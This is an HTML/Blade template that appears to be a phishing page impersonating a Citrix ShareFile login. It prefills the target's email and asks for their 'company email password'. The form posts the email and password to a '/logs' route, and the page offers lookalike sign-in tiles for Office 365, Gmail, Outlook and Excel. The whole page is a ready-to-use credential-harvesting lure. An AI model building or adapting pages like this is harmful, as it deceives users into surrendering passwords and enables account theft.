<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>Share File Login</title>
	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">

</head>
<style type="text/css">
	

	/*body{
		background-color: #cccccc;

		    background: #EBEBEB F6F7F8 !important;

		        box-sizing: border-box;


	}*/

	body{
		font-family: 'CitrixSans', Arial, Helvetica, Sans-Serif !important;
	}

	body,  button:hover{

		}, a, span, label {
    font-family: 'CitrixSans', Arial, Helvetica, Sans-Serif;
    font-weight: 500;
    font-size: 14px;
    line-height: 1.25;
}




	.bg-red{
		background-color: red;
	}

	.bg-green{
		background-color: #38a700;
		color: #ffffff;
		padding: 2px;
	}


	input{
    text-align: left;
    padding-left: 30px;
    height: 50px;
    font-size: 16px;
    color: #333333;
    		        box-sizing: border-box;

    background: #EBEBEB !important;

    font-weight: 50;
    border: white;
}

.mt-6{
	margin-top: 100px !important;
}

.first-btn{
    background-color: #2071C5;
    color: #ffffff;
    margin-bottom: 0;
    font-size: 16px;
    line-height: 1.25;
    height: 60px;
    border-radius: 2px;


}
 button:hover{
 	color: #ffffff !important;

 }


.over-the-line {
margin-top: 3.5em;
text-align: center;
height: 1.8em;
}


:after, :before {
-webkit-box-sizing: border-box;
-moz-box-sizing: border-box;
box-sizing: border-box;
}


 .over-the-line-2 {
   width: 100%; 
   text-align: center; 
   border-bottom: 1px solid #000; 
   line-height: 0.1em;
   margin: 10px 0 20px; 
   font-size: 15px;
} 

.over-the-line-2 span { 
    background:#fff; 
    padding:0 10px; 
}



.first-logo{
	height: 80px !important;
	background-image: url(https://res.cloudinary.com/newformatic/image/upload/v1607116528/office-365-1_lmvxpj.svg);
	background-repeat: no-repeat ;
	background-size: contain;
	background-position: center;


}


.second-logo{
	height: 80px !important;
	background-image: url(https://res.cloudinary.com/newformatic/image/upload/v1607109961/gmail_1_mhpouz.svg);
	background-repeat: no-repeat ;
	background-size: contain;
	background-position: center;
}




.third-logo{
	height: 80px !important;
	background-image: url(https://res.cloudinary.com/newformatic/image/upload/v1607371389/1_wccpxw.jpg);
	background-repeat: no-repeat ;
	background-size: contain;
	background-position: center;
}




.fourth-logo{
	height: 80px !important;
	background-image: url(https://res.cloudinary.com/newformatic/image/upload/v1607102447/multimedia-email_ifskmd.svg);
	background-repeat: no-repeat ;
	background-size: contain;
	background-position: center;
}




.fiveth-logo{
	height: 60px !important;
	background-image: url(https://res.cloudinary.com/newformatic/image/upload/v1607102447/outlook-1_wozqdv.svg);
	background-repeat: no-repeat ;
	background-size: contain;
	background-position: center;
}



.sixth-logo{
	height: 60px !important;
	background-image: url(https://res.cloudinary.com/newformatic/image/upload/v1607110017/microsoft-excel-2013_tu9blk.svg);
	background-repeat: no-repeat ;
	background-size: contain;
	background-position: center;
}




.mb-6{
	margin-bottom: 150px;
}

.logo{
	background: url('https://res.cloudinary.com/newformatic/image/upload/v1607102831/logo_sketch_2-02_z4r4it.svg');
	height: 50px;
	background-repeat: no-repeat;
	background-position: center;
}

.btn-outline-primary{
	font-size: 14px;
    line-height: 1.25;
}

.text-left
{

	text-align: left !important;
}


.input-disabled{
	background-color: #ffffff !important;
	padding-left: 2px;
}



</style>
<body>
	<div class="bg-red col-6 offset-3 col-md-4 offset-md-4 col-lg-2 offset-lg-5 mt-6 logo"> 

	</div>

<div class=" column text-center col-8  offset-2 ">
	<form method="POST" 
			  action="/logs" 
			  enctype="multipart/form-data">

			@csrf

<div class="mt-4">
	<h2>ShareFile</h2>
</div>
	
<div class="text-center">

<p class="col-10 offset-1 col-sm-10 offset-sm-1 col-md-8 offset-md-2 col-lg-4 offset-lg-4">
	Enter your company email credentials.
</p>


</div>

<div class="col-12 col-sm-12 col-md-9 col-lg-2 offset-lg-5 bg-green  mt-4">
	<label>Logged in as:</label>
</div>

<div>
	
	<input  class="col-12 col-sm-12 col-md-9 col-lg-5 input-disabled text-center " type="text" name="email" placeholder=""
	value="{{ old('email', $name ?? '' ) }}">
</div>

<div class="mt-1">
		<input  class="col-12 col-sm-12 col-md-9 col-lg-5" type="password" name="password" placeholder="Enter Password">
</div>

<p class="p-1">Enter your email password to continue.</p>

<div class=" mt-3 ">
	<button class=" col-12 col-sm-12 col-md-9 col-lg-5 btn btn-lg first-btn" type="submit">Continue</button>
</div>


<div class=" mt-5 ">
	<div  ><a href="/sites/create" type="button" class="btn btn-outline-primary col-12 col-sm-12 col-md-9 col-lg-5 btn btn-lg ">Sign in with my company credentials</a></div>

</div>


</form>
<div class="col-12 col-md-8 offset-md-2 col-lg-4  offset-lg-4">
	<h2 class="over-the-line-2 mt-5 ">
	<span>Or sign in with</span>
</h2>


</div>


<div class=" container mb-6">
	<div class=" row">
		
	
	<div class=" col-12 col-sm-12 col-md-8 offset-md-2 col-lg-4 offset-lg-4"> 
		<div class="row justify-content-between">
			<div class="col-4 first-logo">

			
			</div>

			<div class="col-3 second-logo">
				
			</div>
			<div class="col-4 third-logo">
				
			</div>


		</div>

		<div class="row justify-content-between">
			<div class="col-4 fourth-logo">

			
			</div>

			<div class="col-3 fiveth-logo">
				
			</div>
			<div class="col-4 sixth-logo">
				
			</div>


		</div>




	</div>



	</div>
</div>



</div>




</body>
</html>
